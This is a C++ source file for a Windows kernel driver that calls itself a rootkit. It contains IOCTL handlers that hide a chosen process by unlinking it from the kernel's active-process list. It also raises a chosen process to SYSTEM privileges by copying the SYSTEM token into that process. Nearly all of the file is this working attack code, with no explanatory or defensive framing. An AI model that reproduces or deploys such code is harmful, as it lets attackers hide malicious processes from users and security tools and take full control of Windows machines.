#include "ioctl_handlers.h"
#include <Ntstrsafe.h>
#include "token_info.h"

NTSTATUS UnlinkActiveProcessLinks(ULONG pid);
NTSTATUS ElevateByPid(ULONG pid);


NTSTATUS IntegerFromIrp(PIRP Irp,PULONG pid) {


	NTSTATUS status = STATUS_SUCCESS;

	ANSI_STRING pidAnsiString;
	UNICODE_STRING pidUnicodeString;

	RtlInitAnsiString(&pidAnsiString, (PCSZ)Irp->AssociatedIrp.SystemBuffer);
	RtlAnsiStringToUnicodeString(&pidUnicodeString, &pidAnsiString, TRUE);


	if (!NT_SUCCESS(RtlUnicodeStringToInteger(&pidUnicodeString, 10, pid))) {
		status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return status;
	}

	if (!(*pid))
	{
		status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return status;
	}

	return status;

}

NTSTATUS IoctlHandlers::HandleElevate(PIRP Irp) {

	NTSTATUS status = STATUS_SUCCESS;
	ULONG pid;

	KdPrint(("Elevate: recived Elevate ioctl\n"));

	status = IntegerFromIrp(Irp, &pid);

	if (!NT_SUCCESS(status)) {
		Irp->IoStatus.Information = 0;
		return status;
	}

	KdPrint(("Elevate: Recieved process id: %d \n", pid));

	status = ElevateByPid(pid);

	Irp->IoStatus.Information = 0;

	return status;

}
NTSTATUS IoctlHandlers::HandleHideProcess(PIRP Irp) {

	NTSTATUS status = STATUS_SUCCESS;
	ULONG pid;

	KdPrint(("Rootkit: recived HideProcess\n"));

	status = IntegerFromIrp(Irp, &pid);

	if (!NT_SUCCESS(status)) {
		Irp->IoStatus.Information = 0;
		return status;
	}

	KdPrint(("HideProc: Recieved process id: %d \n", pid));

	status = UnlinkActiveProcessLinks(pid);
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	return status;
}

NTSTATUS IoctlHandlers::HandleTestConnection(PIRP Irp, ULONG bufferSize) {

	NTSTATUS status;

	char* inputBuf = (char*)Irp->AssociatedIrp.SystemBuffer;
	char* outputBuf = (char*)Irp->AssociatedIrp.SystemBuffer;

	KdPrint(("TEST_CONN-got input: %s\n", inputBuf));

	char* outputPrefix = "hello from kernel mode :-) recived input-";

	if (bufferSize < (strlen(inputBuf) + strlen(outputPrefix) + 1)) {
		KdPrint(("TEST_CONN-ouput buffer too small.\n"));
		status = STATUS_BUFFER_TOO_SMALL;
		Irp->IoStatus.Information = 0;

	}

	else {
		char* readBuf = reinterpret_cast<char*>(ExAllocatePool(PagedPool, 1024));
		RtlZeroMemory(readBuf, 1024);
		RtlStringCbCatA(readBuf, bufferSize, outputPrefix);
		RtlStringCbCatA(readBuf, bufferSize - strlen(outputPrefix) - 1, outputBuf);
		KdPrint(("TEST_CONN-string is: %s\n", readBuf));
		RtlCopyMemory(outputBuf, readBuf, strlen(readBuf) + 1);
		ExFreePool(readBuf);
		KdPrint(("TEST_CONN-sending to usermode %s\n", outputBuf));
		status = STATUS_SUCCESS;
		Irp->IoStatus.Information = strlen(outputBuf) + 1;
	}


	Irp->IoStatus.Status = status;
	return status;
}


NTSTATUS UnlinkActiveProcessLinks(ULONG pid) {
	NTSTATUS status;
	PEPROCESS EProc;
	PLIST_ENTRY PrevListEntry, NextListEntry, CurrListEntry;


	//get EPROCESS structure
	status = PsLookupProcessByProcessId((HANDLE)pid, &EProc);

	if (!NT_SUCCESS(status)) {
		KdPrint(("HIDE_PROC: Failed to locate process by pid. code: (0x%08X)\n", status));
		return status;
	}

	KdPrint(("HIDE_PROC: EPROCESS struct addr: 0x%08X\n", EProc));

	PULONG procPtr = reinterpret_cast<PULONG>(EProc);

	CurrListEntry = nullptr;

	//scan the structure for the PID field.
	for (ULONG i = 0; i < 0x2bc; i++)
	{
		if (procPtr[i] == pid)
		{
			//calculate ActiveProcessLinks (located near PID)
			CurrListEntry = reinterpret_cast<PLIST_ENTRY>(&procPtr[i + 1]);
			KdPrint(("HIDE_PROC: LIST_ENTRY struct at: 0x%08X\n", CurrListEntry));
			break;
		}
	}

	if (!CurrListEntry)
		return STATUS_UNSUCCESSFUL;

	PrevListEntry = CurrListEntry->Blink;
	NextListEntry = CurrListEntry->Flink;

	// unlink target process from processes near in linked list

	PrevListEntry->Flink = CurrListEntry->Flink;
	NextListEntry->Blink = CurrListEntry->Blink;

	// Point Flink and Blink to self

	CurrListEntry->Flink = CurrListEntry;
	CurrListEntry->Blink = CurrListEntry;

	// Dereference the target process

	ObDereferenceObject(EProc);

	status = STATUS_SUCCESS;
	return status;

}

NTSTATUS ElevateByPid(ULONG pid) {


	NTSTATUS status;

	PEPROCESS EProc;
	PEPROCESS systemProc;


	//get EPROCESS structure
	status = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(pid), &EProc);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Elevate: Failed to locate process by pid. code: (0x%08X)\n", status));
		return status;
	}

	status = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(4), &systemProc);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Elevate: Failed to locate SYSTEM process by pid. code: (0x%08X)\n", status));
		return status;
	}


	KdPrint(("HIDE_PROC: EPROCESS struct addr: %p\n", EProc));
	KdPrint(("HIDE_PROC: SYSTEM EPROCESS struct addr: %p\n", systemProc));

	EX_FAST_REF systemToken = *reinterpret_cast<PEX_FAST_REF>((TOKEN_OFFSET + reinterpret_cast<unsigned char*>(systemProc)));

	KdPrint(("HIDE_PROC: System token EX_FAST_REF: %lu\n", systemToken.Value));

	InterlockedExchange(reinterpret_cast<PLONG>(reinterpret_cast<unsigned char*>(EProc)+TOKEN_OFFSET),systemToken.Value);



	return status;



}


